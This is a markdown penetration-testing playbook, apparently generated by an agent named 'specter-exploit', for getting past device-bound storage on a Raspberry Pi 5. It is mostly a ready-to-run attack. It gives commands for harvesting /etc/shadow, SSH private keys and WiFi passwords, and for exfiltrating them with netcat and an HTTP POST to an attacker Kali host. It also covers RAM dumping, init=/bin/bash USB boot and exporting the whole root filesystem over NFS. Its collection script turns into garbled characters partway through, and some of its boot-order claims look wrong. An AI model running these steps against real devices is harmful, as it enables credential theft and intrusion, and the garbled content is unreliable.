# Phase 4: Storage Lock Bypass Strategies

> **Agent:** specter-exploit  
> **Phase:** Post-Exploitation / Storage  
> **Constraint:** Device-bound storage — cannot clone or image externally

---

## 4.1 Understanding the Storage Lock

The Raspberry Pi 5B implements **device-bound storage** — the SD card and/or NVMe drive is cryptographically tied to the device ID. This means:

```
┌─────────────────────────────────────────────────┐
│              STORAGE LOCK MODEL                 │
│                                                 │
│  SD Card / NVMe                                │
│  ┌─────────────────────────────┐               │
│  │ Encrypted/Device-Bound      │               │
│  │ Contents:                   │               │
│  │  • OS (Raspberry Pi OS)     │─────── X ──→ Cannot read on   │
│  │  • User data                │              │ another machine  │
│  │  • Config files             │               │
│  │  • Keys/certificates        │               │
│  └─────────────────────────────┘               │
│           ↕ (can only be accessed               │
│             on THIS Pi 5B)                      │
│  ┌─────────────────────────────┐               │
│  │ Raspberry Pi 5B             │               │
│  │ BCM2712 + RP1               │               │
│  │ Device ID: [unique]         │               │
│  └─────────────────────────────┘               │
└─────────────────────────────────────────────────┘
```

### What This Means for Attackers
| Attack Type | Status | Notes |
|-------------|--------|-------|
| Clone SD card offline | ❌ Blocked | Device lock prevents boot on other machines |
| Mount filesystem on Kali | ❌ Blocked | Encrypted or device-bound |
| Offline password cracking | ❌ Blocked | Can't read /etc/shadow from external machine |
| Offline forensics | ❌ Blocked | No raw disk access |
| **On-device forensics** | ✅ Possible | If you have a shell |
| **Boot manipulation** | ✅ Possible | If you can modify boot config |
| **Live memory analysis** | ✅ Possible | Dump RAM while running |
| **Alternative boot media** | ✅ Possible | USB/NVMe boot if configured |

---

## 4.2 Strategy 1: On-Device Forensics (Shell Access)

If you've gained a shell (via network or UART), you can do everything an offline forensics exam would do — just on the live system.

### Filesystem Enumeration
```bash
# Full filesystem map
find / -type f -name "*.conf" 2>/dev/null | head -50
find / -type f -name "*.key" 2>/dev/null
find / -type f -name "*.pem" 2>/dev/null
find / -type f -name "id_rsa" 2>/dev/null
find / -type f -name "*.crt" 2>/dev/null

# Sensitive files
cat /etc/shadow          # Password hashes
cat /etc/passwd          # User accounts
cat /etc/sudoers         # Sudo rules
cat /etc/ssh/sshd_config # SSH config
cat /boot/config.txt     # Boot configuration
cat /boot/cmdline.txt    # Kernel command line

# SSH keys
ls -la /home/*/.ssh/
cat /home/*/.ssh/id_rsa
cat /home/*/.ssh/authorized_keys

# History files
cat /home/*/.bash_history
cat /root/.bash_history

# Cron jobs
crontab -l
ls -la /etc/cron.*
cat /etc/crontab
```

### Config File Extraction
```bash
# Create a tarball of sensitive configs
tar czf /tmp/config-exfil.tar.gz \
  /etc/shadow \
  /etc/passwd \
  /etc/sudoers \
  /etc/ssh/ \
  /boot/config.txt \
  /boot/cmdline.txt \
  /home/*/.ssh/ \
  /etc/samba/ \
  /etc/wpa_supplicant/ \
  /etc/docker/ 2>/dev/null

# Exfiltrate via network
# Option A: Netcat to your Kali
nc <kali_ip> 4444 < /tmp/config-exfil.tar.gz

# Option B: HTTP upload
python3 -c "
import http.client
data = open('/tmp/config-exfil.tar.gz','rb').read()
conn = http.client.HTTPConnection('<kali_ip>', 8080)
conn.request('POST', '/upload', data)
"

# Option C: DNS exfiltration (if network is restricted)
# Chunk the data and encode in DNS queries
```

### Memory Dump (RAM Forensics)
```bash
# Read physical memory (if /dev/mem access is available)
sudo dd if=/dev/mem of=/tmp/mem-dump.bin bs=1M

# Or use LiME (Linux Memory Extractor)
sudo apt install lime-dkms
sudo modprobe lime "path=/tmp/memory.lime format=lime"
# Or:
sudo insmod /path/to/lime.ko "path=/tmp/memory.lime format=lime"

# What's in memory:
# - Encryption keys (in use)
# - Passwords (being typed)
# - Active processes' data
# - Network connections
# - File contents (even deleted files' remnants)
```

---

## 4.3 Strategy 2: Boot Manipulation

If the Pi can boot from USB/NVMe (and has been configured to), you can potentially:

### USB Boot Attack Vector

```bash
# 1. Create a bootable USB with your payload
# On Kali:
sudo dd if=raspios-lite.img of=/dev/sdX bs=4M status=progress

# 2. Modify the USB's cmdline.txt to include:
#    init=/bin/bash  (for root shell on boot)

# 3. Insert USB into Pi
# 4. Ensure Pi is configured to boot from USB:
#    Check: cat /proc/cmdline for boot order
#    Or use: raspi-config → Advanced → Boot Order

# 5. Power cycle the Pi
# 6. Pi boots from USB → root shell → access storage lock data
```

### Boot Order on Pi 5
The Pi 5's boot order is stored in the **OTP (One-Time Programmable) memory** and can be modified via `raspi-config` or `/etc/default/raspi-extra-config`:

```bash
# Check current boot order
vcgencmd bootloader_config

# Or:
raspi-config
# → Advanced Options → Boot Order

# Boot order values:
# 0x0 = SD card
# 0x1 = NVMe
# 0x2 = USB
# 0x4 = Network (PXE)
```

### Bootloader Manipulation
```bash
# Update bootloader (could inject malicious bootloader)
sudo rpi-eeprom-update -a

# Check bootloader version
sudo rpi-eeprom-update -v

# The bootloader lives on a separate SPI flash chip
# If you can flash this chip, you control the boot chain
```

---

## 4.4 Strategy 3: Alternative Boot Media with Pivot

Since the locked storage can't be cloned, but the Pi can boot from USB/NVMe:

1. **Create a custom Linux live USB** with forensics tools
2. **Configure Pi to boot from USB** (if not already)
3. **Boot from USB** — this bypasses the locked SD/NVMe
4. **Mount the locked storage** from the running USB OS
5. **Analyze the locked storage** as a secondary drive

```bash
# On your Kali machine — create forensic boot USB
# 1. Write a live Linux image
sudo dd if=kali-linux-2024.1-arm64.iso of=/dev/sdX bs=4M

# 2. Add forensic tools to the live image
#    - Autopsy / sleuthkit
#    - Volatility (for memory analysis)
#    - Binwalk
#    - foremost, photorec

# 3. Boot Pi from this USB

# 4. Once booted, mount the SD card
sudo mount /dev/mmcblk0p2 /mnt/sd     # Root partition
sudo mount /dev/mmcblk0p1 /mnt/sd/boot # Boot partition

# 5. Now you can read the locked storage!
ls -la /mnt/sd/
cat /mnt/sd/etc/shadow
```

⚠️ **This only works if:**
- The Pi's boot order includes USB
- The device lock doesn't prevent reading the SD when booted from another source
- The lock is at the bootloader level (not filesystem encryption)

---

## 4.5 Strategy 4: Network-Based Storage Access

If you have network access to the Pi but not physical:

### SSH Tunneling for Storage Access
```bash
# On your Kali machine
# Create an SSH tunnel to forward filesystem access
ssh -L 2049:localhost:2049 pi@<pi_ip>

# On the Pi (if NFS/Samba is available):
# Export the root filesystem
sudo apt install nfs-kernel-server
echo "/ *(rw,sync,no_subtree_check)" | sudo tee -a /etc/exports
sudo exportfs -a
sudo systemctl start nfs-kernel-server

# Back on Kali, mount via NFS
sudo mount -t nfs localhost:/ /mnt/pi-root
```

### SSHFS (Easiest)
```bash
# Mount Pi's filesystem locally
sshfs pi@<pi_ip>:/ /mnt/pi-remote
# or specific directories
sshfs pi@<pi_ip>:/etc /mnt/pi-etc
sshfs pi@<pi_ip>:/home /mnt/pi-home

# Now you have file-level access without physical access
ls /mnt/pi-remote/etc/shadow
```

### Samba Share
```bash
# If Samba is configured on Pi
smbclient //<pi_ip>/pi -U pi
# or mount it
sudo mount -t cifs //<pi_ip>/pi /mnt/pi-smb -o user=pi
```

---

## 4.6 Strategy 5: Live System Extraction

Extract everything you need while the system is running:

### Full System Snapshot Script
```bash
#!/bin/bash
# Run this on the Pi after gaining shell access

OUTDIR="/tmp/forensic-$(date +%Y%m%d)"
mkdir -p "$OUTDIR"

# Filesystem tree
tree -a / > "$OUTDIR/filesystem-tree.txt" 2>/dev/null
find / -type f > "$OUTDIR/all-files.txt" 2>/dev/null

# System info
uname -a > "$OUTDIR/uname.txt"
cat /etc/os-release > "$OUTDIR/os-release.txt"
id > "$OUTDIR/id.txt"
whoami > "$OUTDIR/whoami.txt"
hostname > "$OUTDIR/hostname.txt"
ip addr > "$OUTDIR/ip-addr.txt"
ip route > "$OUTDIR/ip-route.txt"
ss -tlnp > "$OUTDIR/listening-ports.txt"
ps aux > "$OUTDIR/processes.txt"
df -h > "$OUTDIR/disk-usage.txt"
mount > "$OUTDIR/mount-points.txt"
lsblk > "$OUTDIR/block-devices.txt"
cat /proc/cmdline > "$OUTDIR/boot-cmdline.txt"

# Security-sensitive files
cp /etc/shadow "$OUTDIR/"
cp /etc/passwd "$OUTDIR/"
cp /etc/sudoers "$OUTDIR/"
cp -r /etc/ssh "$OUTDIR/ssh-config/"
cp -r /etc/samba "$OUTDIR/samba-config/" 2>/dev/null
cp -r /etc/wpa_supplicant "$OUTDIR/wifi-config/" 2>/dev/null
cp /boot/config.txt "$OUTDIR/boot-config.txt"
cp /boot/cmdline.txt "$OUTDIR/boot-cmdline.txt"
cp -r /home/*/.ssh "$OUTDIR/ssh-keys/" 2>/dev/null
history > "$OUTDIR/bash-history.txt" 2>/dev/null
crontab -l > "$OUTDIR/cront"" |


 L



              









            
 /



      



# Compress and prepare for exfil
tar czf "$OUTDIR.tar.gz" "$OUTDIR/"
echo "Exfil ready: $OUTDIR.tar.gz"
echo "Size: $(du -h "$OUTDIR.tar.gz" | cut -f1)"
```

### What to Extract
| Data Type | Location | Priority |
|-----------|----------|----------|
| Password hashes | `/etc/shadow` | 🔴 Critical |
| SSH private keys | `~/.ssh/id_rsa` | 🔴 Critical |
| WiFi passwords | `/etc/wpa_supplicant/wpa_supplicant.conf` | 🔴 Critical |
| Samba configs | `/etc/samba/smb.conf` | 🟡 High |
| Boot config | `/boot/config.txt`, `/boot/cmdline.txt` | 🟡 High |
| User home dirs | `/home/*/` | 🟡 High |
| Cron jobs | `/etc/cron.*`, `crontab -l` | 🟡 High |
| Docker configs | `/etc/docker/`, containers | 🟢 Medium |
| App configs | Various `.conf` files | 🟢 Medium |
| Logs | `/var/log/` | 🟢 Medium |
| Bash history | `~/.bash_history` | 🟢 Medium |

---

## 4.7 Strategy 6: Encryption Key Extraction

If the storage lock uses encryption, the keys must be accessible to the device during boot.

### Where Keys Might Be Stored
| Location | Access Method |
|----------|--------------|
| OTP memory (BCM2712) | `vcgencmd otp_dump` or JTAG |
| TPM / Secure Element | Software interface (if present) |
| Bootloader | SPI flash chip |
| Kernel/initrd | Boot partition (if unencrypted) |
| Memory (runtime) | RAM dump |

### Extracting Keys (Runtime)
```bash
# Dump OTP (One-Time Programmable) memory
vcgencmd otp_dump

# Check for secure boot flags
vcgencmd get_config secure_boot

# Extract kernel/initrd (if boot partition is accessible)
cp /boot/kernel8.img /tmp/
cp /boot/initramfs.img /tmp/

# Check if dm-crypt/LUKS is in use
sudo dmsetup ls --tree
cat /etc/crypttab
lsblk -f    # Check for crypto_LUKS filesystem type
```

---

## 4.8 Storage Lock Bypass Decision Tree

```
START: Do you have physical access?
│
├── YES ─→ Can you access UART/serial console?
│          │
│          ├── YES ─→ Try default credentials (pi/raspberry)
│          │          │
│          ├── SUCCESS ─→ You have shell! → Strategy 1 (On-device forensics)
│          │              │
│          ├── FAILURE ─→ Can you boot from USB?
│          │              │
│          ├── YES ─→ Strategy 3 (Alternative boot media)
│          │          │
│          └── NO ─→ Strategy 4 (Network-based) if any network access
│
└── NO ──→ Do you have network access?
           │
           ├── YES ─→ Try SSH/default creds
           │          │
           ├── SUCCESS ─→ Strategy 1 + Strategy 4 (SSHFS mount)
           │
           └── FAILURE ─→ Enumerate services (Strategy 4 - Samba/NFS)
```

---

## 4.9 What the Storage Lock DOESN'T Protect

Even with the lock in place, the Pi is vulnerable to:

| Attack | Lock Prevents? | Notes |
|--------|---------------|-------|
| Live shell access | ❌ No | Need shell, not storage access |
| Credential theft | ❌ No | Can extract from live system |
| Network pivoting | ❌ No | Pi can still relay traffic |
| Persistence | ❌ No | Can modify running system |
| Keylogging | ❌ No | Can hook into input |
| Screen capture | ❌ No | Can capture HDMI output |
| Memory forensics | ❌ No | RAM is accessible |
| Config changes | ❌ No | Can modify running configs |

**Bottom line:** The storage lock protects against *offline* analysis, not *online* attacks. If you can get a shell, the lock is irrelevant.

---

## Next Steps

- [Phase 5: Vulnerability Analysis](05-vulnerability-analysis.md) — map CVEs
- [Phase 6: Exploitation](06-exploitation.md) — execute the plan
- [Phase 7: Post-Exploitation](07-post-exploitation.md) — persist and pivot

---

*The storage lock is a speed bump, not a wall. Get a shell on the running system and you bypass it entirely. Focus your energy on gaining execution, not cracking the disk.*
